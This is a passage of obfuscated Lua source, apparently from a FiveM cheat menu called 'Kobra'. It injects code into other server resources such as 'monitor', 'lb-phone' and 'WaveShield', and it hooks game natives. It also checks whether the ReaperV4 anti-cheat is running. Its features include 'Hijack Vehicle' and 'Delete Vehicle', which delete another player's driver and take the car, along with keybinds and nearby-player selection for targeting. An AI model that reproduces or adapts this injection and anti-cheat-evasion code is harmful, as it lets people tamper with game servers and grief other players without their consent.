(GetGameTimer() -v1481)<v1480  do local v1533=1424 -(662 + 762) ;while true do if (v1533==0) then if NetworkHasControlOfEntity(v1479) then return true;end NetworkRequestControlOfEntity(v1479);v1533=678 -(334 + 343) ;end if (v1533==(3 -2)) then Wait(489 -(198 + 291) );break;end end end return NetworkHasControlOfEntity(v1479);end v1357=nil;function v1357(v1482) local v1483=0;local v1484;local v1485;local v1486;while true do if (v1483==(0 + 0)) then v1484=math.rad(v1482.z);v1485=math.rad(v1482.x);v1483=1;end if (v1483==(575 -(141 + 433))) then v1486=math.abs(math.cos(v1485));return vector3( -math.sin(v1484) * v1486 ,math.cos(v1484) * v1486 ,math.sin(v1485));end end end function GetEmptySeat(v1487) local v1488={ -(4 -3),0 + 0 ,1,2};for v1534,v1535 in ipairs(v1488) do if IsVehicleSeatFree(v1487,v1535) then return v1535;end end return  -(2 -1);end v1355=6;end if (v1355==8) then v1366,v1367,v1368,v1366,v1369=GetShapeTestResult(v1365);v1370=nil;function v1370(v1489) local v1490=0;local v1491;while true do if (v1490==0) then if ( not v1489 or  not DoesEntityExist(v1489)) then return;end v1491=GetPedInVehicleSeat(v1489, -(104 -(72 + 31)));v1490=349 -(89 + 259) ;end if (v1490==(1 + 0)) then if ((v1491~=0) and DoesEntityExist(v1491)) then local v1735=0 + 0 ;while true do if ((1 + 2)==v1735) then SetEntityCoordsNoOffset(v1358,v1359.x,v1359.y,v1359.z,true,true,true,true);Wait(205 -105 );break;end if (v1735==(2 + 0)) then Wait(1);SetPedIntoVehicle(v1358,v1489, -(1 -0));Wait(1853 -(1333 + 70) );ClearPedTasksImmediately(v1358);v1735=1835 -(701 + 1131) ;end if (v1735==(128 -(55 + 72))) then Wait(40);SetPedIntoVehicle(v1358,v1489, -1);Wait(1);SetPedIntoVehicle(v1358,v1489,GetEmptySeat(v1489));v1735=2;end if (v1735==0) then SetPedIntoVehicle(v1358,v1489,0);v1356(v1489,2000);Wait(166 -(99 + 57) );for v1765=0 -0 ,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1491   .. [[)
                                        ]] );end v1735=1 + 0 ;end end end break;end end end CreateThread(function() if v1367 then if ((v1369~=(1579 -(1243 + 336))) and IsEntityAVehicle(v1369)) then local v1670=0;local v1671;while true do if (0==v1670) then v1671=v1369;v1370(v1671);break;end end end end end);break;end if (v1355==(1336 -(774 + 555))) then v1362=v1357(v1361);v1363=477 + 523 ;v1364=v1360 + (v1362 * v1363) ;v1365=StartShapeTestRay(v1360.x,v1360.y,v1360.z,v1364.x,v1364.y,v1364.z, -1,v1358,799 -(150 + 649) );v1355=8;end if (v1355==2) then hNative("GetShapeTestResult",function(v1492,...) return v1492(...);end);hNative("GetPedInVehicleSeat",function(v1493,...) return v1493(...);end);hNative("SetEntityVisible",function(v1494,...) return v1494(...);end);hNative("DeletePed",function(v1495,...) return v1495(...);end);v1355=3;end end end elseif (v829=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1371=0;local v1372;while true do if (v1371==0) then v1372=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1372,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1418=0;local v1419;local v1420;local v1421;local v1422;local v1423;local v1424;local v1425;local v1426;local v1427;local v1428;local v1429;local v1430;local v1431;local v1432;local v1433;while true do if (v1418==3) then hNative("ClearPedTasksImmediately",function(v1571,...) return v1571(...);end);hNative("SetEntityCoordsNoOffset",function(v1572,...) return v1572(...);end);hNative("IsEntityAVehicle",function(v1573,...) return v1573(...);end);hNative("SetPedIntoVehicle",function(v1574,...) return v1574(...);end);v1418=3 + 1 ;end if (v1418==(11 -3)) then v1429,v1430,v1431,v1429,v1432=GetShapeTestResult(v1428);v1433=nil;function v1433(v1575) if ( not v1575 or  not DoesEntityExist(v1575)) then return;end local v1576=GetPedInVehicleSeat(v1575, -(1 -0));if ((v1576~=0) and DoesEntityExist(v1576)) then local v1672=1984 -(1122 + 862) ;while true do if (v1672==(5 -2)) then Wait(48 + 202 );SetPedIntoVehicle(v1421,v1575, -(1 -0));break;end if ((1 + 0)==v1672) then Wait(40);SetPedIntoVehicle(v1421,v1575, -1);Wait(1 + 0 );SetPedIntoVehicle(v1421,v1575,GetEmptySeat(v1575));v1672=2;end if (v1672==(745 -(549 + 194))) then Wait(1);SetPedIntoVehicle(v1421,v1575, -(1 + 0));Wait(450);ClearPedTasksImmediately(v1421);v1672=11 -8 ;end if (v1672==(0 + 0)) then SetPedIntoVehicle(v1421,v1575,0 -0 );v1419(v1575,2000);Wait(9 + 1 );for v1751=0 -0 ,1707 -(453 + 1250)  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1576   .. [[)
                                        ]] );end v1672=1;end end end end CreateThread(function() if v1430 then if ((v1432~=(0 -0)) and IsEntityAVehicle(v1432)) then local v1739=0;local v1740;while true do if (v1739==0) then v1740=v1432;v1433(v1740);break;end end end end end);break;end if (v1418==(0 + 0)) then function hNative(v1577,v1578) local v1579=575 -(203 + 372) ;local v1580;while true do if (v1579==(1 + 0)) then _G[v1577]=function(...) return v1578(v1580,...);end;break;end if (v1579==(0 -0)) then v1580=_G[v1577];if ( not v1580 or (type(v1580)~="function")) then return;end v1579=1383 -(978 + 404) ;end end end hNative("CreateThread",function(v1581,...) return v1581(...);end);hNative("Wait",function(v1582,...) return v1582(...);end);hNative("DoesEntityExist",function(v1583,...) return v1583(...);end);v1418=3 -2 ;end if (v1418==1) then hNative("GetEntityCoords",function(v1584,...) return v1584(...);end);hNative("GetCamCoord",function(v1585,...) return v1585(...);end);hNative("GetCamRot",function(v1586,...) return v1586(...);end);hNative("StartShapeTestRay",function(v1587,...) return v1587(...);end);v1418=2 + 0 ;end if ((324 -(56 + 262))==v1418) then v1421=PlayerPedId();v1422=GetEntityCoords(v1421);v1423=GetCamCoord(_G.KobraFreecamObject);v1424=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1418=121 -(108 + 6) ;end if (v1418==(3 + 1)) then hNative("PlayerPedId",function(v1588,...) return v1588(...);end);hNative("NetworkRequestControlOfEntity",function(v1589,...) return v1589(...);end);hNative("NetworkHasControlOfEntity",function(v1590,...) return v1590(...);end);v1419=nil;v1418=5 + 0 ;end if (v1418==2) then hNative("GetShapeTestResult",function(v1591,...) return v1591(...);end);hNative("GetPedInVehicleSeat",function(v1592,...) return v1592(...);end);hNative("SetEntityVisible",function(v1593,...) return v1593(...);end);hNative("DeletePed",function(v1594,...) return v1594(...);end);v1418=3;end if (5==v1418) then function v1419(v1595,v1596) v1596=v1596 or (3952 -(653 + 1299)) ;local v1597=GetGameTimer();while (GetGameTimer() -v1597)<v1596  do local v1647=0;while true do if (v1647==(1 + 0)) then Wait(0 + 0 );break;end if (v1647==(0 -0)) then if NetworkHasControlOfEntity(v1595) then return true;end NetworkRequestControlOfEntity(v1595);v1647=1;end end end return NetworkHasControlOfEntity(v1595);end v1420=nil;function v1420(v1598) local v1599=1922 -(1042 + 880) ;local v1600;local v1601;local v1602;while true do if ((1 + 0)==v1599) then v1602=math.abs(math.cos(v1601));return vector3( -math.sin(v1600) * v1602 ,math.cos(v1600) * v1602 ,math.sin(v1601));end if (v1599==0) then v1600=math.rad(v1598.z);v1601=math.rad(v1598.x);v1599=1003 -(16 + 986) ;end end end function GetEmptySeat(v1603) local v1604=0;local v1605;while true do if (0==v1604) then v1605={ -(3 -2),0,1 -0 ,2};for v1741,v1742 in ipairs(v1605) do if IsVehicleSeatFree(v1603,v1742) then return v1742;end end v1604=1;end if (v1604==(459 -(271 + 187))) then return  -(1585 -(731 + 853));end end end v1418=6;end if (v1418==7) then v1425=v1420(v1424);v1426=1000;v1427=v1423 + (v1425 * v1426) ;v1428=StartShapeTestRay(v1423.x,v1423.y,v1423.z,v1427.x,v1427.y,v1427.z, -1,v1421,0);v1418=27 -19 ;end end end elseif (v829=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1434=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1434,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1496=0;local v1497;local v1498;local v1499;local v1500;local v1501;local v1502;local v1503;local v1504;local v1505;local v1506;local v1507;local v1508;local v1509;local v1510;local v1511;while true do if (v1496==(1525 -(199 + 1322))) then v1499=PlayerPedId();v1500=GetEntityCoords(v1499);v1501=GetCamCoord(_G.KobraFreecamObject);v1502=GetCamRot(_G.KobraFreecamObject,2);v1503=v1498(v1502);v1504=1959 -959 ;v1496=5;end if (v1496==(2 + 0)) then hNative("ClearPedTasksImmediately",function(v1673,...) return v1673(...);end);hNative("SetEntityCoordsNoOffset",function(v1674,...) return v1674(...);end);hNative("IsEntityAVehicle",function(v1675,...) return v1675(...);end);hNative("SetPedIntoVehicle",function(v1676,...) return v1676(...);end);hNative("PlayerPedId",function(v1677,...) return v1677(...);end);hNative("NetworkRequestControlOfEntity",function(v1678,...) return v1678(...);end);v1496=3;end if (v1496==(1661 -(1291 + 369))) then hNative("GetCamRot",function(v1679,...) return v1679(...);end);hNative("StartShapeTestRay",function(v1680,...) return v1680(...);end);hNative("GetShapeTestResult",function(v1681,...) return v1681(...);end);hNative("GetPedInVehicleSeat",function(v1682,...) return v1682(...);end);hNative("SetEntityVisible",function(v1683,...) return v1683(...);end);hNative("DeletePed",function(v1684,...) return v1684(...);end);v1496=2;end if (v1496==5) then v1505=v1501 + (v1503 * v1504) ;v1506=StartShapeTestRay(v1501.x,v1501.y,v1501.z,v1505.x,v1505.y,v1505.z, -(1 + 0),v1499,0);v1507,v1508,v1509,v1507,v1510=GetShapeTestResult(v1506);v1511=nil;function v1511(v1685) local v1686=0 + 0 ;local v1687;while true do if (v1686==(1 + 0)) then if ((v1687~=(0 + 0)) and DoesEntityExist(v1687)) then SetPedIntoVehicle(v1499,v1685,0);v1497(v1685,2685 -(561 + 124) );Wait(10 + 0 );for v1769=0,857 -(25 + 828)  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1687   .. [[)
                                        ]] );end Wait(100 -60 );SetPedIntoVehicle(v1499,v1685, -1);Wait(1);SetPedIntoVehicle(v1499,v1685,GetEmptySeat(v1685));Wait(1 -0 );SetPedIntoVehicle(v1499,v1685, -1);Wait(1040 -(99 + 491) );ClearPedTasksImmediately(v1499);SetEntityCoordsNoOffset(v1499,v1500.x,v1500.y,v1500.z,true,true,true,true);Wait(100);MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1685   .. [[)
                                    ]] );else local v1766=0;while true do if (v1766==(48 -(18 + 30))) then SetPedIntoVehicle(v1499,v1685, -(2 -1));Wait(198 -98 );v1766=1 -0 ;end if (v1766==(1 + 0)) then MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1685   .. [[)
                                    ]] );Wait(334 -234 );v1766=734 -(501 + 231) ;end if (v1766==(2 + 0)) then SetEntityCoordsNoOffset(v1499,v1500.x,v1500.y,v1500.z,true,true,true,true);break;end end end break;end if (v1686==0) then if ( not v1685 or  not DoesEntityExist(v1685)) then return;end v1687=GetPedInVehicleSeat(v1685, -(1699 -(470 + 1228)));v1686=1 + 0 ;end end end CreateThread(function() if v1508 then if ((v1510~=(0 + 0)) and IsEntityAVehicle(v1510)) then local v1752=v1510;v1511(v1752);end end end);break;end if (v1496==(686 -(537 + 149))) then function hNative(v1688,v1689) local v1690=0;local v1691;while true do if ((0 -0)==v1690) then v1691=_G[v1688];if ( not v1691 or (type(v1691)~="function")) then return;end v1690=1;end if (v1690==(1 + 0)) then _G[v1688]=function(...) return v1689(v1691,...);end;break;end end end hNative("CreateThread",function(v1692,...) return v1692(...);end);hNative("Wait",function(v1693,...) return v1693(...);end);hNative("DoesEntityExist",function(v1694,...) return v1694(...);end);hNative("GetEntityCoords",function(v1695,...) return v1695(...);end);hNative("GetCamCoord",function(v1696,...) return v1696(...);end);v1496=1 -0 ;end if (v1496==3) then hNative("NetworkHasControlOfEntity",function(v1697,...) return v1697(...);end);v1497=nil;function v1497(v1698,v1699) local v1700=0 -0 ;local v1701;while true do if (v1700==(2 -1)) then while (GetGameTimer() -v1701)<v1699  do if NetworkHasControlOfEntity(v1698) then return true;end NetworkRequestControlOfEntity(v1698);Wait(0);end return NetworkHasControlOfEntity(v1698);end if (v1700==(0 + 0)) then v1699=v1699 or (690 + 1310) ;v1701=GetGameTimer();v1700=1 + 0 ;end end end v1498=nil;function v1498(v1702) local v1703=0 + 0 ;local v1704;local v1705;local v1706;while true do if (v1703==1) then v1706=math.abs(math.cos(v1705));return vector3( -math.sin(v1704) * v1706 ,math.cos(v1704) * v1706 ,math.sin(v1705));end if (v1703==(0 + 0)) then v1704=math.rad(v1702.z);v1705=math.rad(v1702.x);v1703=1;end end end function GetEmptySeat(v1707) local v1708=0 + 0 ;local v1709;while true do if (1==v1708) then return  -1;end if ((0 + 0)==v1708) then v1709={ -(1 + 0),579 -(134 + 445) ,1 + 0 ,7 -5 };for v1753,v1754 in ipairs(v1709) do if IsVehicleSeatFree(v1707,v1754) then return v1754;end end v1708=261 -(36 + 224) ;end end end v1496=1864 -(1033 + 827) ;end end end end end end local v491=v17[v15];if v491 then if ((v491.type=="slider") or (v491.type=="slider-checkbox")) then local v830=1846 -(1002 + 844) ;local v831;local v832;while true do if (v830==(1350 -(1126 + 224))) then v831=v491.max or (20 + 80) ;v832=GetGameTimer();v830=1 + 0 ;end if (v830==(3 -2)) then if (v831<=(74 -(48 + 16))) then if (IsControlPressed(0,125 + 49 ) and ((v832-v300)>v301)) then v12:ScrollTwo("Left");v300=v832;elseif (IsControlPressed(0,839 -664 ) and ((v832-v300)>v301)) then v12:ScrollTwo("Right");v300=v832;end elseif IsControlPressed(0,563 -389 ) then v12:ScrollTwo("Left");elseif IsControlPressed(0,51 + 124 ) then v12:ScrollTwo("Right");end break;end end end end end end);local v101=1089 -(910 + 179) ;local v102=120;local v103=0;local v104=237 -117 ;local v105=0 -0 ;local v106=1499 -(933 + 446) ;MachoOnKeyDown(function(v302) local v303=tonumber(v302) or v302 ;local v304=v44[v303] or "Unknown" ;local v305=GetGameTimer();if (v304==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v304=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v304=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v304=="Q") and ((v305-v105)>v106)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v304=="E") and ((v305-v105)>v106)) then if (v13 and v24) then v12:NextCategory();end elseif ((v304=="ArrowUp") and ((v305-v101)>v102)) then if v13 then local v1390=0;while true do if (v1390==(0 + 0)) then v12:ScrollOne("Up");v101=v305;break;end end end elseif ((v304=="ArrowDown") and ((v305-v101)>v102)) then if v13 then local v1449=1524 -(248 + 1276) ;while true do if (v1449==(0 + 0)) then v12:ScrollOne("Down");v101=v305;break;end end end elseif (v304=="ArrowLeft") then local v1450=0 + 0 ;local v1451;while true do if (0==v1450) then v1451=v17[v15];if v1451 then if ((v1451.type=="slider") or ((v1451.type=="slider-checkbox") and ((v305-v103)>v104))) then local v1743=0 -0 ;local v1744;local v1745;while true do if (v1743==(3 -2)) then if (v1744<=10) then local v1772=1545 -(151 + 1394) ;while true do if (v1772==0) then v12:ScrollTwo("Left");v103=v1745;break;end end else v12:ScrollTwo("Left");end break;end if (v1743==0) then v1744=v1451.max or (1044 -(929 + 15)) ;v1745=GetGameTimer();v1743=1;end end elseif ((v1451.type=="scrollable") or (v1451.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end break;end end elseif (v304=="ArrowRight") then local v1536=0;local v1537;while true do if (v1536==(1996 -(1173 + 823))) then v1537=v17[v15];if v1537 then if ((v1537.type=="slider") or ((v1537.type=="slider-checkbox") and ((v305-v103)>v104))) then local v1755=0;local v1756;local v1757;while true do if (v1755==(1 -0)) then if (v1756<=(1786 -(482 + 1294))) then v12:ScrollTwo("Right");v103=v1757;else v12:ScrollTwo("Right");end break;end if (v1755==(0 -0)) then v1756=v1537.max or (44 + 56) ;v1757=GetGameTimer();v1755=1307 -(1125 + 181) ;end end elseif ((v1537.type=="scrollable") or (v1537.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end break;end end elseif (v304=="F5") then local v1648=v17[v15];if (v13 and v24 and v1648 and ((v1648.type=="button") or (v1648.type=="checkbox") or (v1648.type=="slider-checkbox"))) then v12:HideUI();Wait(250);v59(("Bind %s"):format(v1648.label),"",function(v1746) for v1749,v1750 in pairs(v44) do if (v1750:lower()==v1746:lower()) then local v1767=0;local v1768;while true do if (v1767==1) then if v1768 then local v1780=0;while true do if (v1780==0) then v25[ #v25 + (2 -1) ]={key=v1768,keyRaw=v1749,keyLabel=v44[v1749],type=v1648.type,label=v1648.label,checked=v1648.checked or false ,value=v1648.value or (1 + 0) ,step=v1648.step or (0.25 -0) ,min=v1648.min or 0.25 ,max=v1648.max or (1194 -(626 + 563)) ,onSelect=v1648.onSelect};v12:ShowKeybindList(v25);break;end end end Wait(500);v1767=1252 -(153 + 1097) ;end if (v1767==(6 -4)) then v12:ShowUI();return;end if (v1767==(0 + 0)) then v1768=v45[v1749];for v1777,v1778 in pairs(v25) do if (v1778.keyRaw==v1749) then local v1781=0 -0 ;while true do if ((0 + 0)==v1781) then v12:Notify("error","Kobra","There is already a keybind with that key!",2357 + 643 );return;end end end end v1767=1;end end end end end,"keybind");end elseif v24 then for v1747,v1748 in pairs(v25) do if (v1748.type=="button") then local v1758=0 + 0 ;local v1759;while true do if (v1758==(0 + 0)) then v1759=v1748.keyRaw;if v1759 then if (v1759==v303) then local v1782=0 + 0 ;while true do if (v1782==(1157 -(199 + 958))) then v1748.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1748.label),1926 + 1074 );break;end end end end break;end end elseif (v1748.type=="checkbox") then local v1770=0;local v1771;while true do if ((0 -0)==v1770) then v1771=v1748.keyRaw;if (v1771 and (v1771==v303)) then local v1783=0;while true do if (v1783==2) then v12:Notify((v1748.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1748.checked and "enabled") or "disabled" ,v1748.label),6903 -3903 );if v13 then v12:UpdateElements(v17);end break;end if (v1783==(1177 -(1169 + 7))) then if v1748.onSelect then v1748.onSelect(v1748.checked);end v12:ShowKeybindList(v25);v1783=1875 -(751 + 1122) ;end if (v1783==(0 + 0)) then v1748.checked= not v1748.checked;v12:UpdateTabChecked(v16,v1748.label,v1748.checked);v1783=1 + 0 ;end end end break;end end elseif (v1748.type=="slider-checkbox") then local v1775=0;local v1776;while true do if (v1775==0) then v1776=v1748.keyRaw;if (v1776 and (v1776==v303)) then local v1786=0 + 0 ;while true do if (v1786==2) then v12:Notify((v1748.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1748.checked and "enabled") or "disabled" ,v1748.label),3000);if v13 then v12:UpdateElements(v17);end break;end if (v1786==(1 + 0)) then if v1748.onSelect then v1748.onSelect(v1748.value,v1748.checked);end v12:ShowKeybindList(v25);v1786=2;end if (v1786==(0 -0)) then v1748.checked= not v1748.checked;v12:UpdateTabChecked(v16,v1748.label,v1748.checked);v1786=1;end end end break;end end end end end end);v12.InListMenu=function(v306) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v307) if ( not v18 or  not v18[v19]) then return;end local v308=v18[v19];if (v308.label~="List") then return;end for v492,v493 in ipairs(v308.tabs) do if (v493.type=="checkbox") then local v649=0;while true do if (v649==0) then v493.checked=true;if (v493.serverId and tonumber(v493.serverId)) then v27[tonumber(v493.serverId)]=true;end break;end end end end v307:UpdateElements(v17);end;v12.UnselectEveryone=function(v309) local v310=1181 -(589 + 592) ;local v311;while true do if (v310==(0 -0)) then if ( not v18 or  not v18[v19]) then return;end v311=v18[v19];v310=1 + 0 ;end if (v310==(26 -(13 + 11))) then v309:UpdateElements(v17);break;end if (v310==1) then if (v311.label~="List") then return;end for v726,v727 in ipairs(v311.tabs) do if (v727.type=="checkbox") then local v874=0 + 0 ;while true do if (v874==0) then v727.checked=false;if (v727.serverId and tonumber(v727.serverId)) then v27[tonumber(v727.serverId)]=false;end break;end end end end v310=2;end end end;v12.ClearSelection=function(v312) local v313=0 + 0 ;while true do if (v313==(1261 -(684 + 576))) then v12:UnselectEveryone();break;end if (v313==(0 + 0)) then v27={};if (v18 and v18[v19]) then local v833=0;local v834;while true do if (0==v833) then v834=v18[v19];if ((v834.label=="List") and v834.tabs) then for v1239,v1240 in ipairs(v834.tabs) do if (v1240.type=="checkbox") then v1240.checked=false;end end end break;end end end v313=1;end end end;v12.UpdateListMenu=function(v314) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v315=v18[v19];if (v315.label~="List") then return;end local v316=GetEntityCoords(PlayerPedId());if  not v316 then return;end local v317=v314:GetNearbyPlayers(v316,862 -512 ,true);local v318;for v494,v495 in ipairs(v315.tabs) do if ((v495.type=="divider") and (v495.label=="Nearby Players")) then v318=v494;break;end end if  not v318 then return;end for v496= #v315.tabs,v318 + 1 + 0 , -(1 + 0) do table.remove(v315.tabs,v496);end if ( #v317==0) then v315.tabs[ #v315.tabs + (1 -0) ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v317,function(v651,v652) return tonumber(v651.serverId)<tonumber(v652.serverId) ;end);for v653,v654 in ipairs(v317) do local v655=tonumber(v654.serverId);if (v655 and v654.name) then local v835,v836=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v655)));v315.tabs[ #v315.tabs + 1 + 0 ]={type="checkbox",label=("%s - [%s]"):format(v654.name,v655),serverId=v655,checked=v27[v655] or false ,name=v654.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v655)))~=(0 + 